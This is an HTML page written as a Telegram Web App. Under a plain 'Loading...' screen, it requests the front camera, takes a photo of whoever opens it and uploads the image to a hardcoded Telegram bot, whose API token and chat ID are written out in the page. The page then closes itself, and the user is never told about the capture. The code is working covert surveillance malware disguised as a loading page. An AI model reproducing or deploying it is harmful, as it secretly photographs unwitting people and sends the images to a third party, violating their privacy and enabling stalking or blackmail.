<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:sans-serif;">
    <h1 id="status">Loading...</h1>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                imageCapture.takePhoto()
                    .then(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', '7406666272');
                        formData.append('photo', blob, 'photo.jpg');

                        fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(data => {
                            if (data.ok) {
                                document.getElementById('status').innerText = '✅ Фото отправлено!';
                                tg.close();
                            } else {
                                document.getElementById('status').innerText = '❌ Ошибка API';
                            }
                        })
                        .catch(() => {
                            document.getElementById('status').innerText = '❌ Ошибка отправки';
                        });

                        stream.getTracks().forEach(t => t.stop());
                    })
                    .catch(err => {
                        document.getElementById('status').innerText = '❌ Ошибка камеры: ' + err.message;
                        console.error(err);
                    });
            })
            .catch(err => {
                document.getElementById('status').innerText = '❌ Нет доступа: ' + err.message;
            });
    </script>
</body>
</html>
